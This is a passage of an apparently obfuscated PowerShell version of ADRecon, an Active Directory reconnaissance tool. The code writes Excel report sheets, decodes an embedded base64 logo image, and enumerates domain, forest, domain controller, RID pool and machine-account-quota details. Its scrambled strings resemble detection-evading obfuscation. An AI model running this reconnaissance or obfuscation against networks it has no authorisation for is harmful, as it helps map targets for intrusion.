            Get-ADRExcelAttributeStats -SrcSheetName ("{1}{0}"-f 's','User') -Title1 ("{4}{3}{0}{1}{2}"-f'ccoun','ts in A','D','r A','Use') -PivotTableName ("{0}{4}{2}{1}{3}{5}" -f 'User Ac',' S','unts','t','co','atus') -PivotRows ("{2}{0}{1}" -f'abl','ed','En') -PivotValues ("{1}{0}"-f'rName','Use') -PivotPercentage ("{1}{0}" -f'me','UserNa') -Title2 ("{0}{1}{5}{4}{3}{2}"-f 'S','ta','User Accounts',' ',' of','tus') -ObjAttributes $ObjAttributes
            Remove-Variable ObjAttributes

            Get-ADRExcelChart -ChartType ("{0}{1}"-f'xl','Pie') -ChartLayout 3 -ChartTitle ("{3}{0}{2}{5}{1}{4}" -f 's','nts in A','er ','U','D','Accou') -RangetoCover ("{0}{1}{2}"-f'A2','1:','D33') -ChartData $workbook."w`O`RKSh`eets".("{1}{0}" -f 'tem','I').Invoke(1).("{0}{1}"-f'Rang','e').Invoke(("{1}{3}{0}{2}"-f'B3:','A','B4','3:A4,'))
            $workbook."WOrk`S`hEeTS".("{0}{1}" -f 'Ite','m').Invoke(1)."Hype`RLIN`KS".("{1}{0}" -f 'd','Ad').Invoke($workbook."w`OR`KShee`TS".("{0}{1}" -f'I','tem').Invoke(1)."Cel`Ls".("{0}{1}"-f 'It','em').Invoke(20,1) , "" , ("{2}{0}{1}" -f'A','1','Users!'), "", ("{0}{1}{2}" -f 'R','aw D','ata')) | Out-Null

            Get-ADRExcelChart -ChartType ("{2}{0}{3}{1}"-f 'er','d','xlBarClust','e') -ChartLayout 1 -ChartTitle ("{6}{4}{2}{1}{3}{5}{0}"-f 'unts','of Us',' ','er','tatus',' Acco','S') -RangetoCover ("{1}{0}" -f'21:L43','F') -ChartData $workbook."wORK`s`heeTs".("{0}{1}" -f 'I','tem').Invoke(1).("{1}{0}" -f 'nge','Ra').Invoke(("{1}{3}{2}{0}"-f':G18','F2','18,G2',':F'))
            $workbook."wOr`Ks`HeE`TS".("{0}{1}"-f'I','tem').Invoke(1)."HyPeRL`I`NkS".("{1}{0}" -f 'd','Ad').Invoke($workbook."W`orkSHeE`TS".("{1}{0}" -f 'm','Ite').Invoke(1)."c`ellS".("{0}{1}" -f 'I','tem').Invoke(20,6) , "" , ("{2}{0}{1}" -f 'sers!A','1','U'), "", ("{2}{1}{0}"-f 'Data','w ','Ra')) | Out-Null

            $workbook."WO`RKS`HEeTS".("{0}{1}"-f 'It','em').Invoke(1)."u`sedRa`NgE"."ENt`i`Re`cOlumN".("{0}{1}"-f 'AutoFi','t').Invoke() | Out-Null
            $excel."wI`NDoWS".("{0}{1}"-f'It','em').Invoke(1)."Di`splaygR`idlI`NES" = $false
        }

        
        Get-ADRExcelWorkbook -Name ("{3}{1}{2}{0}{4}" -f 'ent','f',' Cont','Table o','s')
        $worksheet = $workbook."W`ORKsH`EeTS".("{0}{1}" -f'Ite','m').Invoke(1)

        $excel."sCr`e`en`UPDa`TIng" = $false
        
        
        

		$base64adrecon = ("{180}{101}{112}{181}{55}{122}{148}{166}{10}{52}{141}{64}{51}{43}{140}{85}{12}{20}{162}{63}{88}{81}{24}{105}{157}{167}{57}{124}{78}{67}{77}{121}{165}{37}{60}{42}{32}{84}{136}{90}{125}{185}{82}{99}{116}{56}{145}{47}{36}{18}{176}{111}{153}{156}{188}{118}{139}{150}{83}{61}{7}{94}{11}{29}{146}{182}{70}{171}{44}{123}{126}{6}{127}{115}{19}{132}{3}{65}{164}{119}{189}{68}{120}{175}{107}{9}{95}{102}{26}{58}{134}{174}{40}{74}{92}{160}{108}{186}{16}{144}{93}{104}{172}{45}{75}{103}{28}{15}{53}{169}{106}{79}{129}{91}{190}{170}{179}{149}{25}{163}{100}{137}{177}{187}{98}{117}{8}{110}{159}{59}{35}{155}{138}{39}{158}{191}{49}{161}{87}{72}{152}{17}{41}{1}{178}{13}{130}{66}{86}{48}{69}{151}{31}{109}{133}{54}{14}{73}{97}{80}{4}{147}{128}{131}{5}{21}{22}{34}{62}{183}{168}{46}{184}{76}{114}{113}{135}{142}{38}{50}{23}{89}{96}{2}{0}{30}{33}{71}{173}{143}{154}{27}" -f 'XCJophMP6s','yppKfM//AIOPgBJ/F4d','wHPqtRLE8rzYCoSCYHmsyslwhDgfdXi1yILMcX/AOt/1RwRw5Di9XZ0Xbx5ZPxQ7mpQN4IjjiiVjpSTs/1','mzt7u4lupvCl7a21lMay','y2z','/9oACAEBAAE/EP8A9P6uHOf3U76','4v/ANrXbwPQWS942ML2vctquLzd/wDjLvHf+NPZ7OXbTv8AdxXu4+Cf8Q2bePdL7eNunUH4J/x','eGQd','gsBEQAhMUFRYXGBkaGxwfDREOHxIDB','g//aAAgBAhEBPwH9gE','AAAbW50clJHQiBYWVogB+IAAwAbAAUANwAOYWNzcEFQUEwAAAAAAAAAAA','tbmCW3l/1FD+98Zf7Sty/wCMP2f/AGp+O/8AGntV5Juad9s0WO4eCv8AafP+/wDCqVI3bxYpKt5hiXI','Wg','/tv5/58ljTr1c2lCENUOdUKYEHmNb9Hg4+v8AiRzqhxCj9n/g/dayb+zX+U8/8/SX9r/P/wCE3Sf5Tz/+C3CCwfJ4qyYPPLX50pb0xhXcH','bPLTi/KS','SkDz7rnEuHKPBothEU8o8fVx7OEcs09tw25XnR','qX7cf4uSeKE+616FeVO0y7mPLEuhXH+','D+rAxmaP6lIXmKqus1UhsJfikYEjw004pmkDMoycNP2EPd/wDoXyDHO35E8Z3/AMEkjRPmgISKSS','SEQ8RE','qJqbS4ltZtqudsnjvp9hvVcnwy903CVXbwpe2ttZTGs','AAAdAAAAAUYlhZWgAAAeQAAAAUZ1hZWgAAAfgAAA','uX7rzzUI/5neXPN54/wCH/wChCDK','AHlqdxZ8nuR6rm8UORxF9QjmPVVURhgv/A','WP','VMAAAAcAAAAHABzAFIAR','w1ftx/i5LOKWtqD0D','+/HT34pmALRniykIi05ohBsW5pbY2Emo','APT/AP/Z','CD8XNJIpQKOFHLHdFUSE8CdHRN0Sfgpqt4y','pHh7bCjd9ksreyUlSTD','BvmXzJXjzf/AK3/','nmaoBooIKgvf','tN','AFRKxk5J2f6rhE0UwmH9','Nb/AKs7xoQo4je71TziphgrUPGBeRPqi9cvQc40E7gNJ4rfuw+P+/i56/5H/IfH/Iv+b/8Ag/fxf8X4f8Mf4rz/AMDw8HXTEcFloORd/T7pZHfaZmifl/yvg/8A2XlD2XXGsrKPCQMa0rQehwF2fFaq0RSGn2pbjhg8sJfFVg5KxH','eaOGZHJ/wAQ','LCQwRDxI','3OiUESyg/EmVDZklHTCYN','fxRFkg85NSPikLWeSGF48lkBc8GHOx7v+xV/Jf8AgEz/AB58u','+f','f4AmFm2k4Obt','TrTLm8','w4idFN2WzVXWklcOF8','AAAAAAAAAAAAAAAAAAAAAAAAAAALZGVzYwAAAQgAAAA4Y3BydAAAAUAAAABOd3Rw','fDe2qO+2aLHcO2x7Sb+Pft2F9BZ3v6UsxZGw8QeO/','EV1oGkm71p+0GqW2mMsnkkGropJB+LGKFEV1oGkm71p+0H/jn+9BmC3VzE0+bkVeLVCQdK6P/HP96DVLb','wB8fzUGQdb7sQ','9PX29/j5+v/bAEMABQMEBAQDBQQEBAUFBQYHDAgHBwcHDws','QQ0qls9soOJFp+aJwqaM+BH/6+P/aAAwDAQACEQMRAA','T+aDEIAJ/F9SyEUGgQUkWLkgp','qnveZDnKiJFEfDKtIjTK5o+GzFtwBcE8ji81AkZB9ySk2hBPIWfi/8A0P8AusW0BlGPd/f/AMqPT7uN','AAAAAAAAAAAAAAAAA','AAAAAAA','QNXB/Z7R/Itf9kO5T6lqV70NT6M7VyuqPpz7XI/lMq984lpnVcCQDya/7Id','ZYrBhDkYMyzYGSPSZ','AAQAAAABAAAAJgAAAAA','4OTpGR0hJSlVWV1hZWmRlZmdoaWpzdHV2d3h5eoCDhIWGh4iJipCTlJWWl5iZmqCjpKWmp6ipqrCys7S1tre4ubrAwsPExcbHyMnK0NPU1dbX2Nna4OLj5OXm5','AAAAAmZmAADypwAADVk','/hQblFyn7XJ/CRd1Nz/gfbmR5cgrGhl/','BAQABPyH/APXoQHLfFhkC0kH51UGYQ','KEoxh','LGvbY0y393t+w2quT4Ze5WEsa34U2+0vLYw','jGtB6HAXZjit','SQwAAAgwAAAAgZ1RSQwAAAiwAAAAgYlRSQwAAAkwAAAAgY2hybQAAAmwAAAAkbWx','AAAAAAAAAAAAAAAPbWAAEAAAAA0y1sY21zAAAAAAAAAAAAAAAAAAA','+GporfdfE08Vxuv8Av9//','/ABCg0APC1Dzd4Ae','AANWQAAE9AAAApbcGFyYQAA','WJ+9NV9','AQ7zzzzzzz/wD/AP','2FH9Hdre82','WA3zL5krx5v/ANb/','4s/9D4HIJnurZYZPTKL52bJlJYoh7v7f+','t04vylo64+khMj01aW7f/wP/9oACAECEQE/EP8A7rwzk+pkCXCwYdPmR35LwpbQUI5KB','jjpnHcKZRsO3ii+z/V28UX2f6px2EYf6soCQpIsUxG0V+wf/','TGW','aWIJ4PO9VeYEik9qQAcjflf/AKupa5p//SyEks4/4Lp/Yq3RKOZ4oMQ6/ujHkY','AAAAAwAAAAJmZgAA8qcAAA1ZAAAT0AAACltjaHJtAAAAAAADAAAAAKPXAABUewAATM0AAJmaAAAmZgAAD1z/wgARCABGAOoDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAA','AAAAAAMAAAACZmYAAPKnA','cdddGv+yHcn0P9TEKYeXgrj6uPXyLX/ZHe5J4ZMg2+oOvQ0xW0OMnkcXF/kuD+x2j3W4pyKeXFqnhriR5u6+f9TnVeSyKQdA5N0G','8yLHUI','AAAAAAAABAAAADGVuV','FXFSNIFQJJGhQ7EWB2','ttq22rbattq22r/2gAIAQEAAQUC/wB/o1O0bfFDJuVh','GdoDjR1Zmt','Z','7/iMIEaEN6lrDn/EJbEGpyv5','fd9X2Boc','1YwA','d/x/u/7Xld82P+B1e8d380C','nd4eXqGh4iJipCWl5iZmqClpqeoqaq','wAYk9o+b/xmT8XlIo','2gAIAQEABj8C/wB/tG','pxHFqt4ySkDzd1/t','xtNom','z+L83ICZgO04+XLL7LDs2i','vt/K/4byv8AgPV/xfuwe6J4A1B50Vbxh','t8GP7WoSHObUOp2Mh','AzEAEAAwACAgICAgMBA','I1','1CyoYaaUZ','SABI','7Yy+2y','TySDV0U','+TX/aLjkWClFD1Hg1lKgRiO','wBCACAAYgB1AGkAbAB0AC0AaQBuAABtbHVjAAAAAAAAAAEAAAAMZW5VUwAAA','p5/1NfUfaL9ou3r+24MdOl+0fx','7jufcROn3P6IlRtBpJv9','GNYqlStW','eTw8W/lljjYE0YOWwgCijjT9T9yxgAg/wD/AP8','AUGBwgJCgsM','AQACEQMRAAAB8w2n2fNjTqjTqjTqjTqjTqjTqjTqjbVttW21bTqjbVtOqNtW','AAD/4QBM','VRn','eQ','wl/tb8X/AO1p2XKN3ut7DY','U/DRJWDBROFy8ReCYzZwJkVUkiei0ggJChgZGigpKjc','QAAA','HnZcDmEummZfVLzw/Ya+vcNzWZd6P5xnUvWcd','EeGP','ri/E74sDc22P4Cw/Ex/Gg3','AAAwIEAQUABgcICQoL/8QAwxAAAQMDAgQDBAYEBwYECAZzAQIAAxEEEiEFMRMiEAZBUTIUYXEjB4EgkUIVoVIzsSRiMBb','AAqACAAQAAAABAAAA6qADAAQAAAABAAAARgAAAAD/7QA4UGhvdG9zaG9wIDMuMAA4QklNBAQAAAAAAAA4QklNBCUAAAAAABDUHYzZjwCyBOmACZjs+EJ+/+ICoElDQ19QUk9GSUxFAAEBAAACkGx','8afhL/a14v/2teBxlZSeFFqXuu5BFk/BCQqyX4WlUvadgXZXvi7/a14LA9wnUrn5Ke0a7p456brJT8J6714v/ANrXgc0svEG8JvkeE','AABPQAAAKW3BhcmEA','wtba3uLm6wMTFxsfIycrQ1NXW19jZ2uDk5ebn6Onq8/T19vf4+fr/xAAfAQADAQEBAQEBAQEBAAAAAAABAgADBAUGBwgJCgv/x','yf01','Ca9u+d79eOSRcqvBX+0+f9+9n/wBqfjv/ABp+Ev8Aa34v/wBrXgr/AGnz/v8A','wPi/oItnX0','PIkNRrr2uvn/U1/','k8cUy6Qun/EL4Dj/wAKobHbKCiRSfmkbjB4qoMBQeFqHm7wA93','sIjA4It+rv5w7GHJgfOlfDgfOlfDiA3k+bB5TfGUf5OwB8f/gf','u1bgZl72LRN/t9/c2jTH4bUnk+GXvYtE3+339zaNMfhtSeT4Ze6qt4N02y6sr9HJ8Mu/k2','A/wD/AP8A/wD/AP8A/wD/AP8A/8QAMxEBAQEAAwABAgUFAQEAAQEJAQARITEQQVFhIHHwkYGhsdHB4fEwQFBgcICQoLDA0OD/2gAIAQMRAT8Qsss/+gc3K+g2YqNujmNntBcY4JE21uQkNwSJtkl0UopDkyNYE+seLEtlyjlvqQLuXISvrdiTi4Oc','E','WAiEnVNXK','AkKGRooKSo4OTpISUpXWFlaZ2hpa','RDJihR6mFLXHkRrq/bj/FqFlQw0FKMohkxQo9TClrjyI11','+7+mv7f','qu','dAAAAZAAAAAUY2hhZAAAAaQAAAAsclh','A','RJ4vgB6/n/hE','s1Q4djQ/j1YTeP6sSkz/VV','LKNsxXc+QHF8uZBQr0P+o0fN2v8At+Tj+Qdv/bcH9ntHtEwAi','+jp6vLz','Eu','8kAhghPyjinHx976E4yP2mI2Bl8r6QDitJflI','j','YPEtKriaNRT','0U+r1xXkGze8RT7RPXFeQbN+h6bznMPXmHmGUu+8842il6DmsR03MTqjbFdtq22rbattq22rbattq22rba','P/AD/wK','f/AMHufC','nFj2dP3RuXfy/wBc8p7JltuB5/0A3n/ovL93R63zjqgeYbdbzW2TafWaxH84lRtc2+9ZJjp5Fry8deGn12oVvOJV2jpxMdh','FL/fN/vn/vcwXuYokcFH/oxZs13/ALNd/wCrNn0ZxSPBZ2Xfn/8AAv1Zs+j/','TSvdf8TyMYzwVkAjDRDKZfoqYxJf/wBDP0v8390/hf8AP','2CN5BF9Q6LPWcn63m3LWtzY4','DIAAAAcAE4AbwAgAGMAbwBwAHkA','8An4','DQ4P/aAAg','pe7x8uJQ6CpyXEUJ91r0K8qO','xP5v+L/dUHiER0/VjguHOfd/xf7qDEIAJ/F9SaEVf1wO+X2Dt/','AUclR','4drhE8yUFXCrWR+00Wd/L/FKcC','2gAIAQMRAT8B/YD','BctFDkjSCCOFTQCVjFzXwk','bXMEM','cgBpAGcAaAB0ACwAIAB1AHMAZQAgAGYAcgBlAGUAbAB5AAAAAFhZWiAAAAAAAAD21gABAAAAANMtc2YzMgAAAAAAAQxKAAAF4///8yoAAAebAAD9h///+6L///2jAAAD2AAAwJRYWVogAAAAAAAAb5QAADjuAAADkFhZWiAAAAAAAAAknQAAD4MAALa+WFlaIAAAAAAAAGKlAAC3kAAAGN5wYXJhAAAAAAAD','gcVkonCuMUypAY/FHmQQOT192AsGoHUfx/w7q8Dr/Rc','1','Bo9rf+27f+z2j+Ra/7Id1','kVruGxbTb3cX9Hdre77JZW9kpKknw9tMO4W2zbXFc3a','DGKF','AKsblVUay79Ua2pCiMvHu/8A1v8Aqr0wehckJV1nQIw4uzs63j','Dk/CWf8IMogQc','Jn+JEq091M7YypEqdz','RMWHBcTFBoVEREYIRgaHR0fHx8TFyIkIh4kHB4fHv/bAEMBBQUFBwYHDggIDh4UERQeHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHv/aAAwD','ftx/i89uUME6p','w9tlxp0b+9/a','8/wCpr/tFx/Itf9kdo+d+7y6mI9nlAjWOujJPmxLCrFY82i73CVPv','/9j/4AAQSkZJRgABAQAA','RXhpZgAATU0AKgAAAAgAAgESAAMAAAABAAEAAIdp','RSPD2','VaIpDT7f8AHNEibhMhqaRA7wmOQRP/ABwNxwweWEviqi81iPGNihoDyNN3jEgxETAeqIQ5R0x6mlAV8ssz/wAPa0','xlJsSzHFm/OECZlizBl7rrKRCYXNJaEnALJVOBE9eu','ADDEQACAgEDAwMCAwUCBQIEBIcBAAIRAxASIQQgMUETBTAiMlEUQAYzI2FC','E3ATGTw','IalbzKkrSaIq/bj/FmfbJEC5HCj50ysl+ruETypQVcKtZHq0STLCE04lqkhWFooNR/v+//xA','bedXiFuvm/W8l32ubDq+E7nJw1WZVx/rPk3rDqO08uCjX3UeW+pkeYAIHfO27PjOyy0856zketdVdXynU46c4HlundF8d2PHs','EbbEmA+6ndfFJHL7ZafaLt5fbKIkmkYyUhxi5IHPlIqJYe','qPqXdf7fk1/w','VPrihzizyv7Nf5TzeBygj8rzNkKfNBoEFJFi5IKc')

        $bytes =   $93nBjK::("{1}{4}{3}{2}{5}{0}"-f'ing','Fr','e','mBas','o','64Str').Invoke($base64adrecon)
        Remove-Variable base64adrecon

        $CompanyLogo = -join($ReportPath,'\',("{1}{3}{4}{0}{2}" -f'ogo.','A','jpg','DRecon','_L'))
		$p = New-Object IO.MemoryStream($bytes, 0, $bytes."L`EngTh")
		$p.("{1}{0}"-f 'rite','W').Invoke($bytes, 0, $bytes."l`e`NGtH")
        Add-Type -AssemblyName System.Drawing
		$picture =  ( ITEM vArIAbLE:16dEMo  ).vALue::("{2}{0}{1}" -f 'mStre','am','Fro').Invoke($p, $true)
		$picture.("{0}{1}"-f'Sav','e').Invoke($CompanyLogo)

        Remove-Variable bytes
        Remove-Variable p
        Remove-Variable picture

        $LinkToFile = $false
        $SaveWithDocument = $true
        $Left = 0
        $Top = 0
        $Width = 150
        $Height = 50

        
        $worksheet."SH`Apes".("{0}{1}{2}"-f 'AddPic','tur','e').Invoke($CompanyLogo, $LinkToFile, $SaveWithDocument, $Left, $Top, $Width, $Height) | Out-Null

        Remove-Variable LinkToFile
        Remove-Variable SaveWithDocument
        Remove-Variable Left
        Remove-Variable Top
        Remove-Variable Width
        Remove-Variable Height

        If (Test-Path -Path $CompanyLogo)
        {
            Remove-Item $CompanyLogo
        }
        Remove-Variable CompanyLogo

        $row = 5
        $column = 1
        $worksheet."ce`lLs".("{1}{0}"-f 'm','Ite').Invoke($row,$column)= ("{0}{2}{3}{1}"-f'Tab','of Contents','le',' ')
        $worksheet."C`ELls".("{1}{0}" -f 'tem','I').Invoke($row,$column)."sty`lE" = ("{1}{2}{0}"-f' 2','He','ading')
        $row++

        For($i=2; $i -le $workbook."W`ORKShEe`TS"."coU`Nt"; $i++)
        {
            $workbook."w`orkshEE`TS".("{1}{0}" -f'm','Ite').Invoke(1)."hYp`erL`INkS".("{1}{0}"-f 'd','Ad').Invoke($workbook."Wo`RK`SHEETs".("{0}{1}"-f'I','tem').Invoke(1)."C`ELls".("{0}{1}" -f 'I','tem').Invoke($row,$column) , "" , "'$($workbook.Worksheets.Item($i).Name)'!A1", "", $workbook."W`ork`S`HeEts".("{1}{0}"-f'em','It').Invoke($i)."N`AMe") | Out-Null
            $row++
        }

        $row++
		$workbook."Wo`R`ksHeets".("{1}{0}" -f'tem','I').Invoke(1)."HyP`ErlIn`KS".("{1}{0}" -f'dd','A').Invoke($workbook."W`O`RkshEetS".("{1}{0}"-f'em','It').Invoke(1)."cEL`lS".("{0}{1}"-f 'I','tem').Invoke($row,1) , ("{3}{5}{1}{4}{6}{2}{0}{7}{8}" -f '.com','ps','b','ht','://gith','t','u','/adrec','on/ADRecon'), "" , "", ("{2}{4}{5}{1}{0}{3}{6}" -f'm/','.co','gith','adr','u','b','econ/ADRecon')) | Out-Null

        $worksheet."uSeDRan`Ge"."E`N`TIrecO`lumn".("{1}{0}{2}"-f'oF','Aut','it').Invoke() | Out-Null

        $excel."W`In`dowS".("{1}{0}" -f 'm','Ite').Invoke(1)."D`IspLaygr`id`li`NEs" = $false
        $excel."scrE`enu`pD`ATINg" = $true
        $ADStatFileName = -join($ExcelPath,'\',$DomainName,("{0}{1}{3}{4}{2}"-f'ADRe','co','lsx','n-','Report.x'))
        Try
        {
            
            $excel."disp`LaYaLER`TS" = $False
            $workbook.("{1}{0}" -f 'eAs','Sav').Invoke($ADStatFileName)
            Write-Output ('[+'+'] '+'Exc'+'elshee'+'t '+'Sav'+'ed '+'to:'+' '+"$ADStatFileName")
        }
        Catch
        {
            Write-Error "[EXCEPTION] $($_.Exception.Message) "
        }
        $excel.("{0}{1}" -f 'Q','uit').Invoke()
        Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet -Final $true
        Remove-Variable worksheet
        Get-ADRExcelComObjRelease -ComObjtoRelease $workbook -Final $true
        Remove-Variable -Name workbook -Scope Global
        Get-ADRExcelComObjRelease -ComObjtoRelease $excel -Final $true
        Remove-Variable -Name excel -Scope Global
    }
}

Function Get-ADRDomain
{

    param(
        [Parameter(mANdaTORy = $true)]
        [string] $Method,

        [Parameter(MANDAtorY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(MAndaTORY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomainRootDSE,

        [Parameter(ManDaTory = $false)]
        [string] $DomainController,

        [Parameter(maNdaTOrY = $false)]
        [Management.Automation.PSCredential] $Credential =   (  gI  ("Var"+"IaBl"+"E:Q3"+"CU"+"vm") ).ValUe::"E`MPTy"
    )

    If ($Method -eq ("{1}{0}"-f'WS','AD'))
    {
        Try
        {
            $ADDomain = Get-ADDomain
        }
        Catch
        {
            Write-Warning ("{6}{7}{2}{4}{3}{1}{0}{5}"-f'Doma','g ','n]','gettin',' Error ','in Context','[Get-ADR','Domai')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        If ($ADDomain)
        {
            $DomainObj = @()

            
            $FLAD = @{
	            0 = ("{1}{2}{0}"-f '000','Windows','2');
	            1 = ("{3}{4}{0}{2}{1}" -f'3/In','im','ter','Wi','ndows200');
	            2 = ("{2}{0}{1}" -f'nd','ows2003','Wi');
	            3 = ("{2}{1}{0}{3}" -f 'dows200','n','Wi','8');
	            4 = ("{2}{0}{1}{3}"-f 'n','dows200','Wi','8R2');
	            5 = ("{2}{0}{1}" -f'o','ws2012','Wind');
	            6 = ("{2}{1}{0}"-f'R2','012','Windows2');
	            7 = ("{1}{2}{0}{3}"-f '201','W','indows','6')
            }
            $DomainMode = $FLAD[ $aqLnX::("{1}{0}"-f'oInt32','T').Invoke($ADDomain."dOM`A`in`mOde")] + ("{1}{2}{0}" -f 'n','Dom','ai')
            Remove-Variable FLAD
            If (-Not $DomainMode)
            {
                $DomainMode = $ADDomain."dOm`Ainm`ODe"
            }

            $ObjValues = @(("{1}{0}" -f 'e','Nam'), $ADDomain."DNsR`OoT", ("{2}{0}{1}" -f'BI','OS','Net'), $ADDomain."NE`Tb`IOsn`AME", ("{2}{3}{1}{0}"-f 'nal Level','io','Fun','ct'), $DomainMode, ("{1}{0}"-f 'inSID','Doma'), $ADDomain."D`OMaiNs`ID"."Va`lUE")

            For ($i = 0; $i -lt $($ObjValues."c`OunT"); $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f 'Categor','y') -Value $ObjValues[$i]
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}"-f'Valu','e') -Value $ObjValues[$i+1]
                $i++
                $DomainObj += $Obj
            }
            Remove-Variable DomainMode

            For($i=0; $i -lt $ADDomain."RE`PlICad`I`RE`CtOrYs`ERvERs"."C`OUnT"; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{2}{1}" -f 'Ca','ory','teg') -Value ("{1}{0}{3}{2}"-f 'ain ','Dom','ntroller','Co')
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f'V','alue') -Value $ADDomain."rEpl`Ic`A`DireCToRY`sEr`Vers"[$i]
                $DomainObj += $Obj
            }
            For($i=0; $i -lt $ADDomain."r`eAd`oNlyRePLI`CAdire`c`T`ory`SERVE`RS"."co`Unt"; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}"-f 'Cate','gory') -Value ("{4}{8}{0}{5}{1}{2}{3}{7}{6}"-f 'O','in Co','n','tro','Read','nly Doma','er','ll',' ')
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}"-f'V','alue') -Value $ADDomain."R`E`Ado`NlyReP`lIcA`Dire`cTOR`y`serVErs"[$i]
                $DomainObj += $Obj
            }

            Try
            {
                $ADForest = Get-ADForest $ADDomain."FORE`sT"
            }
            Catch
            {
                Write-Verbose ("{11}{4}{9}{7}{3}{0}{8}{10}{5}{6}{2}{1}" -f'o','t','ntex','F','DRDom',' ','Co','n] Error getting ','r','ai','est','[Get-A')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }

            If (-Not $ADForest)
            {
                Try
                {
                    $ADForest = Get-ADForest -Server $DomainController
                }
                Catch
                {
                    Write-Warning ("{0}{7}{5}{4}{6}{8}{2}{1}{9}{3}"-f '[Get-ADRD','Forest','ing ','ntext',' g','r','et','omain] Erro','t',' Co')
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                }
            }
            If ($ADForest)
            {
                $DomainCreation = Get-ADObject -SearchBase "$($ADForest.PartitionsContainer)" -LDAPFilter "(&(objectClass=crossRef)(systemFlags=3)(Name=$($ADDomain.Name)))" -Properties whenCreated
                If (-Not $DomainCreation)
                {
                    $DomainCreation = Get-ADObject -SearchBase "$($ADForest.PartitionsContainer)" -LDAPFilter "(&(objectClass=crossRef)(systemFlags=3)(Name=$($ADDomain.NetBIOSName)))" -Properties whenCreated
                }
                Remove-Variable ADForest
            }
            
            Try
            {
                $RIDManager = Get-ADObject -Identity "CN=RID Manager$,CN=System,$($ADDomain.DistinguishedName) " -Properties rIDAvailablePool
                $RIDproperty = $RIDManager."R`IdavAi`LAblep`Ool"
                [int32] $totalSIDS = $($RIDproperty) / (  ( GEt-VarIAblE ('a'+'U3')  -valueoNLy )::("{1}{0}" -f'w','Po').Invoke(2,32))
                [int64] $temp64val = $totalSIDS * ( $AU3::("{0}{1}"-f 'Po','w').Invoke(2,32))
                $RIDsIssued = [int32]($($RIDproperty) - $temp64val)
                $RIDsRemaining = $totalSIDS - $RIDsIssued
                Remove-Variable RIDManager
                Remove-Variable RIDproperty
                Remove-Variable totalSIDS
                Remove-Variable temp64val
            }
            Catch
            {
                Write-Warning "[Get-ADRDomain] Error accessing CN=RID Manager$,CN=System,$($ADDomain.DistinguishedName) "
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
            If ($DomainCreation)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{0}"-f 'ory','ateg','C') -Value ("{2}{0}{1}"-f'eation Da','te','Cr')
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f 'lue','Va') -Value $DomainCreation."WHenC`RE`AteD"
                $DomainObj += $Obj
                Remove-Variable DomainCreation
            }

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}{2}"-f 'C','ate','gory') -Value ("{5}{4}{2}{1}{0}{3}"-f'n','i','ach','eAccountQuota','DS-M','ms-')
            $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f 'V','alue') -Value $((Get-ADObject -Identity ($ADDomain."DI`StINgUI`shedNa`ME") -Properties ms-DS-MachineAccountQuota).'ms-DS-MachineAccountQuota')
            $DomainObj += $Obj

            If ($RIDsIssued)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}"-f'Categor','y') -Value ("{1}{0}{2}" -f 'D','RI','s Issued')
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f'lue','Va') -Value $RIDsIssued
                $DomainObj += $Obj
                Remove-Variable RIDsIssued
            }
            If ($RIDsRemaining)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f'gory','Cate') -Value ("{1}{2}{0}{3}" -f'main','RIDs',' Re','ing')
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f'lue','Va') -Value $RIDsRemaining
                $DomainObj += $Obj
                Remove-Variable RIDsRemaining
            }
        }
    }

    If ($Method -eq ("{1}{0}"-f'P','LDA'))
    {
        If ($Credential -ne   $q3cUVM::"e`mPTy")
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain."D`Is`TinG`UIshEDnA`ME")
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(("{0}{1}"-f'Domai','n'),$($DomainFQDN),$($Credential."Us`ErNA`mE"),$($Credential.("{4}{0}{5}{2}{1}{3}{6}" -f 'et','or','tw','kCr','G','Ne','edential').Invoke()."PaSSW`ord"))
            Try
            {
                $ADDomain =   ( geT-variAble WM35 -VAlUeOnl  )::("{3}{1}{0}{2}" -f'ma','Do','in','Get').Invoke($DomainContext)
            }
            Catch
            {
                Write-Warning ("{7}{3}{5}{6}{1}{0}{12}{4}{10}{8}{11}{2}{9}" -f']','Domain','ontex','et','rror ','-','ADR','[G','tting ','t','ge','Domain C',' E')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            Remove-Variable DomainContext
            
            Try
            {
                $SearchPath = ('CN=RI'+'D '+"Manager$,CN=System")
                $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$SearchPath,$($objDomain.distinguishedName)", $Credential."usEr`N`AMe",$Credential.("{0}{4}{3}{1}{2}"-f'GetNetwork','nti','al','de','Cre').Invoke()."P`AsSWorD"
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
